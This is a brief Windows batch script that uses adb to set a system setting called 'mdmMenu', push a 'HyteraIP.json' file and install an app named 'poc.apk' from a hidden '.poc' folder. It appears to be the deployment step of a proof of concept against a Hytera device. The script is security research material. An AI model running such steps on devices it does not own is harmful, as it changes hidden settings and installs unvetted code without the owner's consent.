@echo off



adb shell rm -f /sdcard/.poc/poc.apk

adb shell settings put system mdmMenu 1

adb push HyteraIP.json /sdcard/
adb push poc.apk /sdcard/.poc/poc.apk
adb install -r poc.apk


